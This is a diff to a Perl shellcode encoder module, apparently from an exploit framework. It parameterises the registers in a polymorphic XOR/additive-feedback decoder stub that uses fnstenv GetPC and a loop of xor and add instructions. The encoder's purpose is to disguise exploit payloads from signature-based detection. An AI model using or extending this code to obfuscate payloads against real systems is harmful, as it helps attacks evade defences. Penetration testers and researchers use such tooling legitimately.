@@ -39,6 +39,9 @@ sub _EncodeSelfEnd {
 
   my $bm = $self->_BuildBM(length($rawshell));
   my $decoder = $bm->Build;
+  $decoder =~ s/\|\|KEYREG\|\|/0/sg;
+  $decoder =~ s/\|\|ADDRREG\|\|/3/sg;
+  print STDERR $decoder;
   my $delta = Pex::Poly::DeltaKing->new;
   $delta->AddData($decoder);
   $decoder = $delta->Build;
@@ -84,13 +87,16 @@ sub _BuildBM {
   }
 
   my $fnstenv = $bmb->new('fnstenv', "\xd9\x74\x24\xf4"); # fnstenv [esp - 12]
-  my $pop = $bmb->new('popEbx', "\x5b"); # pop ebx
+  my $pop = $bmb->new('popEbx', '[>1  chr(0x58 + ||ADDRREG||)<]'); # pop ebx
+
+  # if I ever decide to give up a byte and move to jns
+  my $zeroReg = '[>1 chr(0xc9)<]';
   my $zero = $bmb->new('clearEcx',
-    "\x31\xc9", # xor ecx, ecx
-    "\x29\xc9", # sub ecx, ecx
+    "\x31" . $zeroReg, # xor ecx, ecx
+    "\x29" . $zeroReg, # sub ecx, ecx
     # xvr rockin the hizzy
-    "\x33\xc9", # xor ecx, ecx
-    "\x2b\xc9", # sub ecx, ecx
+    "\x33" . $zeroReg, # xor ecx, ecx
+    "\x2b" . $zeroReg, # sub ecx, ecx
   );
 
   my $mov = $bmb->new('movXorlen');
@@ -101,34 +107,26 @@ sub _BuildBM {
     $mov->AddBlock("\x66\xb9" . $l->{'lengthWord'}); # mov cx, WORD xorlen
   }
 
-  my $movkey = $bmb->new('movXorkey', "\xb8" . 'XORK'); # mov eax, xorkey
+  my $movkey = $bmb->new('movXorkey', '[>1 chr(0xb8 + ||KEYREG||)<]' . 'XORK'); # mov eax, xorkey
   my $loopXor = $bmb->new('loopBlock');
 
+  # xor [ebx+dist], eax
+  my $xor = "\x31" . '[>1 chr(0x40 + ||ADDRREG|| + (8 * ||KEYREG||))<]';
+  my $xor1 = $xor . '[>1 chr(:end: - :fpu: - 4)<]';
+  my $xor2 = $xor . '[>1 chr(:end: - :fpu: - 8)<]';
+  my $add = "\x03" . '[>1 chr(0x40 + ||ADDRREG|| + (8 * ||KEYREG||))<]';
+  my $add1 = $add . '[>1 chr(:end: - :fpu: - 4)<]';
+  my $add2 = $add . '[>1 chr(:end: - :fpu: - 8)<]';
+  my $sub4 = "\x83" . '[>1 chr(0xe8 + ||ADDRREG||)<]' . "\xfc";  # sub ebx, -4
+  my $add4 = "\x83" . '[>1 chr(0xc0 + ||ADDRREG||)<]' . "\x04";  # add ebx, 4
   $loopXor->AddBlock(
-    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]".     # xor [ebx+0x1b], eax
-    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]".     # add eax, [ebx+0x18]
-    "\x83\xeb\xfc",                         # sub ebx,-4
+    $xor1 . $add1 . $sub4,
+    $xor1 . $sub4 . $add2,
+    $sub4 . $xor2 . $add2,
 
-    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]".     # xor [ebx+0x1b], eax
-    "\x83\xeb\xfc".                         # sub ebx,-4
-    "\x03\x43[>1 chr(:end: - :fpu: - 8)<]", # add eax, [ebx+0x18]
-
-    "\x83\xeb\xfc".                         # sub ebx,-4
-    "\x31\x43[>1 chr(:end: - :fpu: - 8)<]". # xor [ebx+0x1b], eax
-    "\x03\x43[>1 chr(:end: - :fpu: - 8)<]", # add eax, [ebx+0x18]
-
-
-    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]".     # xor [ebx+0x1b], eax
-    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]".     # add eax, [ebx+0x18]
-    "\x83\xc3\x04",                         # add ebx, 4
-
-    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]".     # xor [ebx+0x1b], eax
-    "\x83\xc3\x04".                         # add ebx, 4
-    "\x03\x43[>1 chr(:end: - :fpu: - 8)<]", # add eax, [ebx+0x18]
-
-    "\x83\xc3\x04".                         # add ebx, 4
-    "\x31\x43[>1 chr(:end: - :fpu: - 8)<]". # xor [ebx+0x1b], eax
-    "\x03\x43[>1 chr(:end: - :fpu: - 8)<]", # add eax, [ebx+0x18]
+    $xor1 . $add1 . $add4,
+    $xor1 . $add4 . $add2,
+    $add4 . $xor2 . $add2,
   );
 
   my $loop = $bmb->new('loopIns', "\xe2\xf5[>0 end<]");# loop xor_xor
